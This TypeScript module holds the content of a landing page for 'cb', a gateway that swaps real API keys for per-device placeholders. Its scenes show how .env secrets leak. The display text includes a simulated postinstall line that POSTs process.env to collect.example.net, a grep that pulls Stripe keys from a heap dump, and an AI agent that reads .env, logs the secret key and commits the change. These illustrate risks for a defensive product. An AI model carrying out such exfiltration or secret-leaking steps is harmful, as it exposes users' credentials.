/**
 * The story sections of the landing page: how a .env leaks today, how an AI coding agent reads it, and how cb makes
 * a placeholder key. Real keys are only ever shown masked ("sk_live_••••"), never as a credential-shaped string (FR-LP-003).
 */

export const MASK = "••••••••";

/** Hero scene: the readers that get a .env today. */
export const scene = {
  label: "Animated scene: a .env file and five things that read it",
  file: ".env",
  keys: [
    { key: "STRIPE_SECRET_KEY", real: `sk_live_${MASK}`, standIn: "sk_test_cb_amber-otter-falls" },
    { key: "OPENAI_API_KEY", real: `sk-proj-${MASK}`, standIn: "sk-cb-quiet-river-lamp" },
    { key: "DATABASE_URL", real: `postgres://admin:${MASK}@prod`, standIn: "postgresql://cb-silver-fox@127.0.0.1" },
  ],
  readers: [
    { id: "npm", label: "npm package", out: "collect.example.net" },
    { id: "ai", label: "AI agent", out: "model provider" },
    { id: "logs", label: "Logs", out: "log vendor" },
    { id: "dump", label: "Heap dump", out: "crash report" },
    { id: "git", label: "git push", out: "public repo" },
  ],
  gateway: "cb gateway",
  modes: {
    without: { label: "Without cb", caption: "Every reader gets the real key, and so does everywhere it sends it." },
    with: {
      label: "With cb",
      caption: "Readers only get placeholder keys that work nowhere else. The real key stays with cb.",
    },
  },
  reached: "has your key",
  worthless: "worthless",
};

export type LeakLine = { text: string; tone?: "cmd" | "hot" | "dim" | "warn" };

/** The same terminal line with cb: every real key becomes its placeholder. */
export function withStandIns(text: string): string {
  return text
    .replace(`sk_live_${MASK}`, "sk_test_cb_amber-otter-falls")
    .replace(`postgres://admin:${MASK}@prod`, "postgresql://cb-silver-fox@127.0.0.1")
    .replace(" create mode 100644 .env", " create mode 100644 .env   (placeholders only)");
}
export type Leak = {
  id: string;
  title: string;
  text: string;
  window: string;
  lines: LeakLine[];
  to: string[];
  /** What the same reader gets with cb. */
  withCb: string;
};

export const leaks = {
  title: "How a .env leaks today",
  intro: "Nobody has to steal the file. Keys get out through the ordinary things a project does every day.",
  items: [
    {
      id: "deps",
      title: "A dependency reads it while it installs",
      text: "Install scripts run with your user's rights. One compromised package in a tree of hundreds can read process.env or the .env file and post it anywhere.",
      window: "npm install",
      lines: [
        { text: "$ npm install", tone: "cmd" },
        { text: "added 1,284 packages in 9s", tone: "dim" },
        { text: "> pretty-colors@4.1.2 postinstall", tone: "dim" },
        { text: "> node setup.js", tone: "dim" },
        { text: 'fetch("https://collect.example.net", {', tone: "warn" },
        { text: '  method: "POST", body: JSON.stringify(process.env) })', tone: "warn" },
        { text: `STRIPE_SECRET_KEY=sk_live_${MASK}`, tone: "hot" },
      ],
      to: ["collect.example.net"],
      withCb: "The package sends a placeholder key. It is useless anywhere but this device.",
    },
    {
      id: "logs",
      title: "Your own logs keep a copy",
      text: "One debug line prints the config. Now the key sits in the terminal, the log vendor, the error tracker and every place they forward to.",
      window: "npm run dev",
      lines: [
        { text: 'console.log("config", config)', tone: "cmd" },
        { text: "config {", tone: "dim" },
        { text: `  stripeKey: "sk_live_${MASK}",`, tone: "hot" },
        { text: `  dbUrl: "postgres://admin:${MASK}@prod"`, tone: "hot" },
        { text: "}", tone: "dim" },
        { text: "→ shipped to logs, error tracker", tone: "warn" },
      ],
      to: ["log vendor", "error tracker"],
      withCb: "The log shows a placeholder. Nothing to change if it leaks.",
    },
    {
      id: "memory",
      title: "Anything in the process can read it",
      text: "A secret manager still hands the real value to your process. From there a heap dump, an attached debugger or an edited file in node_modules can read it.",
      window: "node --inspect",
      lines: [
        { text: "$ node --heapsnapshot-signal=SIGUSR2 server.js", tone: "cmd" },
        { text: "Wrote Heap.20261113.heapsnapshot", tone: "dim" },
        { text: '$ grep -o "sk_live_[A-Za-z0-9]*" Heap.*.heapsnapshot', tone: "cmd" },
        { text: `sk_live_${MASK}`, tone: "hot" },
        { text: "→ attached to a crash report", tone: "warn" },
      ],
      to: ["crash report"],
      withCb: "The process never held the real key, so no dump can contain it.",
    },
    {
      id: "travel",
      title: "And the file travels",
      text: "It gets pasted into a chat to help a new hire, committed by a git add -A, shown in a screen share. Revoking one person then means rotating every key.",
      window: "terminal",
      lines: [
        { text: '$ git add -A && git commit -m "wip"', tone: "cmd" },
        { text: " create mode 100644 .env", tone: "hot" },
        { text: "$ git push origin main", tone: "cmd" },
        { text: "→ public in history, even after you delete it", tone: "warn" },
      ],
      to: ["git history", "chat", "screen share"],
      withCb: "The file only holds placeholders. Removing someone is one click, not a round of key changes.",
    },
  ] satisfies Leak[],
};

export type AgentStep =
  | { kind: "user"; text: string }
  | { kind: "say"; text: string }
  | { kind: "tool"; name: string; arg: string }
  | { kind: "env"; key: string; real: string; standIn: string }
  | { kind: "code"; text: string };

export const agent = {
  title: "Your AI coding agent reads .env too",
  intro:
    "An agent that can open files can open .env. Whatever it reads goes into the model's context, and from there into places you don't control.",
  window: "agent session",
  toggle: { without: "Without cb", with: "With cb" },
  replay: "Play again",
  steps: [
    { kind: "user", text: "The Stripe webhook returns 400. Can you fix it?" },
    { kind: "say", text: "Let me check how Stripe is configured." },
    { kind: "tool", name: "Read", arg: ".env" },
    { kind: "env", key: "STRIPE_SECRET_KEY", real: `sk_live_${MASK}`, standIn: "sk_test_cb_amber-otter-falls" },
    { kind: "env", key: "STRIPE_WEBHOOK_SECRET", real: `whsec_${MASK}`, standIn: "whsec_cb_maple-cloud-tidy" },
    {
      kind: "env",
      key: "DATABASE_URL",
      real: `postgres://admin:${MASK}@prod`,
      standIn: "postgresql://cb-silver-fox@127.0.0.1:7401",
    },
    { kind: "say", text: "Found it. I'll add a debug line and commit." },
    { kind: "tool", name: "Write", arg: "scripts/debug-webhook.ts" },
    { kind: "code", text: 'console.log("using", process.env.STRIPE_SECRET_KEY)' },
    { kind: "tool", name: "Bash", arg: 'git commit -am "debug webhook"' },
  ] satisfies AgentStep[],
  whereTitle: "Where the key is now",
  where: [
    "The model provider's request logs",
    "This session's history on disk",
    "Your terminal scrollback",
    "Git history, once pushed",
    "Any tool a hidden instruction asked the agent to call",
  ],
  verdict: {
    without: "The real key. Rotate it, everywhere.",
    with: "A placeholder. It only works on this device, through cb, while access lasts.",
  },
};

/** "Where placeholder keys come from", told by scroll in four steps (no controls). */
export const placeholders = {
  title: "Where placeholder keys come from",
  intro:
    "cb issues a different placeholder for every device and every key. Only cb’s server can make one, so a copied placeholder is worthless.",
  server: "cb server",
  steps: [
    {
      title: "You add the real key once",
      text: "An admin pastes the Stripe key into the cb dashboard. It is encrypted on cb’s server and can never be read back, not even by admins.",
    },
    {
      title: "cb issues a placeholder to Maya’s device",
      text: "When Maya starts her app, cb derives it from her device, the environment and the service, signed with a secret only the server holds. The result is her placeholder.",
    },
    {
      title: "Every device gets its own",
      text: "Ravi’s device gets a different placeholder for the same Stripe key. No value is shared, so offboarding one person never means rotating keys for the whole team.",
    },
    {
      title: "A copied placeholder does nothing",
      text: "If Maya’s placeholder turns up on another device, in a log or in an AI model’s context, cb refuses it. It was never the real key.",
    },
  ],
  vault: {
    label: "Real Stripe key",
    value: `sk_live_${MASK}`,
    note: "Encrypted at rest. Never sent to a developer machine.",
  },
  recipe: {
    label: "Made from",
    devices: ["Maya’s device", "Ravi’s device"],
    env: "Development",
    service: "Stripe",
    secret: "Server secret",
  },
  issued: [
    { device: "Maya’s device", value: "sk_test_cb_amber-otter-falls", verdict: "Works", ok: true },
    { device: "Ravi’s device", value: "sk_test_cb_cedar-lamp-meadow", verdict: "Works", ok: true },
    { device: "Another device", value: "sk_test_cb_amber-otter-falls", verdict: "Refused", ok: false },
  ],
  copied: "copied from Maya",
  footnote:
    "Shown as words here so they are easy to tell apart. Real placeholders look like real keys, so the official SDKs accept them.",
};
